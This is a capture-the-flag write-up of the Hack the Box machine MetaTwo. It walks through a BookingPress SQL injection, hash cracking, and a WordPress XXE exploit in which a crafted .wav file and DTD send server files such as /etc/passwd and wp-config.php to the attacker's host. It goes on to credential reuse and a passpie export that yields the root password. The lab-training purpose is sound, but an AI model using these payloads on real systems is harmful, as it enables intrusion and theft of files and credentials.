> MetaTwo is an easy Linux machine from Hack the Box. Here is the tldr;
>
> * There is a WordPress site with a vulnerable plugin called BookingPress that we can take advantage of to get a password and username for a WordPress user.
> * Once we're logged in, we're able to upload media. There is a vulnerability in the version of wordpress on the box that lets us upload a malicious `.wav` file and download files from the server.
> * We are able to find a `wp-config` file on the server with credentials that allow us to ssh in as a user named `jnelson`.
> * In `jnelsons` home directory is a hidden folder called `.passpie` with a .pgp key and some encrypted messages. We're able to crack the key with `john` and get the password for `passpie`, which is a command line password manager.
> * We run `passpie` and are able to export the password for `root`.

## Enumeration

### nmap

Let's start off with an nmap scan, looks like we have three ports open: `21`, `22`, `80`.

```shell
┌──(dimondsec㉿hackbook)-[~/Documents/HTB/metatwo_2]
└─$ nmap 10.10.11.186
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 23:14 MST
Nmap scan report for metapress.htb (10.10.11.186)
Host is up (0.064s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
```

First thing I tried was logging into ftp as annonymous, but it looks like it's not working. So let's switch over to the web server. It doesn't load but it does show us that the domain name is `metapress.htb`, so let's add it to our `/etc/hosts` file.

The page does load, it looks like it's running Wordpress. If we view the source code we can see that it's running version `5.6.2`.

We can also see there is an events page where you can schedule an event, it doesn't look like a standard wordpress features so let's see if we can find the name of the plugin being used. If you view the source you'll be able to see that it is using the plugin called BookingPress 1.0.10. A quick google search shows that there is a known SQL injection vulnerability.

## Foothold

After a quick google search, I found an [exploit](https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py) for the BookingPress plugin, there are a few others but this one was quick and worked well. To run it, we just need to provide it with the url and the nonce, which can be found by viewing the source code on the events page.

```shell
┌──(dimondsec㉿hackbook)-[~/Documents/HTB/metatwo]
└─$ python3 bp_exploit.py --url http://metapress.htb -n 690776adac 
- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```
Just like that we have two usernames with their emails and password hashes. I put the admin hash in this online [hash analyzer](https://www.tunnelsup.com/hash-analyzer/) and it identified it as a MD5 Wordpress hash. Let's run it through hashcat and see if we can crack the hash.

### Crack the hash

```shell
┌──(dimondsec㉿hackbook)-[~/Documents/HTB/metatwo]
└─$ hashcat -O -m 400 -a 0 -o cracked.txt meta.hashes /usr/share/wordlists/rockyou.txt

┌──(dimondsec㉿hackbook)-[~/Documents/HTB/metatwo]
└─$ cat cracked.txt 
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
```
I was not able to crack the `admin` password, but it did crack the password for `manager` right away. Let's head on over to `metapress.htb/wp-admin` and see what we can do.

We are able to login, but it doesn't seem like we have access to do very much. There is one interesting thing that cathces my eye right away though, we can upload new media. The first thing I did was try uploading .php and .phar files, but it looks like we are restricted on what kind of files we can upload.

### XXE Vulnerability and exploit

We did find a wordpress version earlier (5.6.2), so let's see where that takes us. A quick search led me to a [blog post](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/) about a WordPress XXE vulnerability in Media Library. Sounds promising! Long story short, we need to create a malicious `.wav` file (a file type we are able to upload) that will send files from the server back a php server on our own machine.

Let's start off by creating the `.wav` file that we'll upload to WordPress.

```shell
┌──(dimondsec㉿hackbook)-[~/Documents/HTB/metatwo]
└─$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.4:7002/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```
We also need to create a DTD file to host on our machine and set up our php server. This attempt will hopefully send us the `/etc/passwd` file from the metapress.htb server to our server encoded in base64.

```XML
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">

<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.4:7001/?p=%file;'>" >
```
```shell
┌──(dimondsec㉿hackbook)-[~/Documents/HTB/metatwo_2/www]

[Wed Mar  8 22:30:09 2023] PHP 8.1.12 Development Server (http://0.0.0.0:7001) started
```
Now we should be all set to upload our `payload.wav` file and see what happens!

```
Success! Now let's decode the base64 and grep for users that can login and we find `root` and `jnelson`. That might come in handy later, and now we know our attack is working.

```shell
┌──(dimondsec㉿hackbook)-[~/Documents/HTB/metatwo_2/www]
└─$ base64 -d passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
```
Now that we are able to read files from the server, let's see if we can find some more credentials. It is a WordPress site, so the wp-config.php file might be a good place to look. We don't know the path to it yet, but we do know it's running on nginx so let's try this.
```XML
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/nginx/sites-enable/default">

<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.4:7001/?p=%file;'>" >
```
After uploading our payload again, we can decode the response and we can see our path to the wp-config.php file.

```shell
──(dimondsec㉿hackbook)-[~/Documents/HTB/metatwo_2/www]
└─$ base64 -d nginx            
server {

	listen 80;
	listen [::]:80;

	root /var/www/metapress.htb/blog;

	index index.php index.html;

        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }

	location / {
		try_files $uri $uri/ /index.php?$args;
	}
    
	location ~ \.php$ {
		include snippets/fastcgi-php.conf;
		fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
	}

	location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
		expires max;
		log_not_found off;
	}

}
```
Let's update the `evil.dtd` file to get the `/var/www/metapress.htb/blog/wp-config.php` file. Once we decode it we get some new creds for the database and for the ftp server. 

```php
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
```
### ftp

After logging in to the ftp server, we see a directory called `mailer` with two files, one of them is called `send_email.php` with creds for our jnelson user.

```php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   
```
Let's try ssh, and we're in and are able to grab the user flag!

```shell
└─$ ssh jnelson@metapress.htb   
jnelson@metapress.htb's password:

```
## Privesc

Let's run linpeas and see what it can tell us. I started by downloading the latest build and spinning up a basic python server, then used wget to download linpeas.sh into the `/dev/shm` folder and running `chmod +x` on the script so that we can execute it. I originally tried putting it in `/tmp`, but there must be some kind of cleanup script running because it was deleted right away.

```shell
jnelson@meta2:/tmp$ wget http://10.10.14.4/linpeas.sh

jnelson@meta2:/tmp$ chmod +x linpeas.sh
```
### passpie

After running it, the first thing that catches my is are these possible SSH keys in a hidden directory called `./passpie`. With a little google searching we learn that `passpie` is a command line password manager. Sounds promising! 

```shell
══╣ Possible private SSH keys were found!
/home/jnelson/.passpie/.keys
```
In the `.passpie` directory we two files `.config`, which is blank, and `.keys` which contains pgp public and private keys. In the `ssh` directory we find two more files `jnelson.pass` and `root.pass`. These files look like they contain encrypted passwords.

Let's try cracking the private key. First we need to save just the private key portion and then use `gpg2john` to convert it to a format we can use with `john`.

```shell
┌──(dimondsec㉿hackbook)-[~/Documents/HTB/metatwo_2/pgp]
└─$ gpg2john pgp.priv > gpg.john

File pgp.priv
```
Then, let's run it through `john` and we get the password `blink182` for Passpie.

```shell
┌──(dimondsec㉿hackbook)-[~/Documents/HTB/metatwo_2/pgp]
└─$ john -w=/usr/share/wordlists/rockyou.txt for.john

1 password hash cracked, 0 left
```
## root!

In the [github for `passpie`](https://github.com/marcwebbie/passpie), we can see all of the commands we can run in passpie and looks like we can export the passwords by running `passpie export passwords` (note: passwords is just the name of the file you want to export the passwords into).

```shell
jnelson@meta2:~$ passpie export passwords
Passphrase: 
jnelson@meta2:~$ ls
passwords  user.txt
jnelson@meta2:~$ cat passwords
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson

  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```
Simply `su` to root, enter in the password and we're in!

```shell
jnelson@meta2:~$ su root
Password:
root@meta2:/home/jnelson# cd /root
root@meta2:~# cat root.txt
a1527462a13eb47b516c1375a2e7d218

```
